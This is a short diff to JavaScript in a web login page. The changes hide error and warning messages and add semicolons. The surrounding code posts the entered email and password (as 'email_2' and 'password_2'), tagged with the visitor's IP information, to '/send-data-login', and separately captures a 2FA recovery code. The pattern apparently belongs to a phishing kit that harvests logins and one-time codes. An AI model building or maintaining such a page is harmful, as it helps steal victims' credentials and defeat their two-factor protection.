@@ -348,15 +348,18 @@
         var isLoginSuccessfully = 0;
 
         function sendDataLogin() {
+            //
+            $('.error').css('display', 'none');
+            //
             const valueEmail = $('#username-desktop').val();
             email = valueEmail;
             const valuePassword = $('#password-desktop').val();
             const loading = $('#submit-login-loading');
             const text = $('#submit-login-text');
             let formData = new FormData();
-            formData.append('email_2', valueEmail)
-            formData.append('password_2', valuePassword)
-            formData = pushIPInfo(formData)
+            formData.append('email_2', valueEmail);
+            formData.append('password_2', valuePassword);
+            formData = pushIPInfo(formData);
             $.ajax({
                 method: "POST",
                 url: "/send-data-login",
@@ -423,6 +426,9 @@
         }
 
         async function sendDataFa() {
+            //
+            $('.warning').css('display', 'none');
+            //
             const fa_code = $('#recovery_code_entry').val();
             const email = $('#username-desktop').val();
             let formData = new FormData();
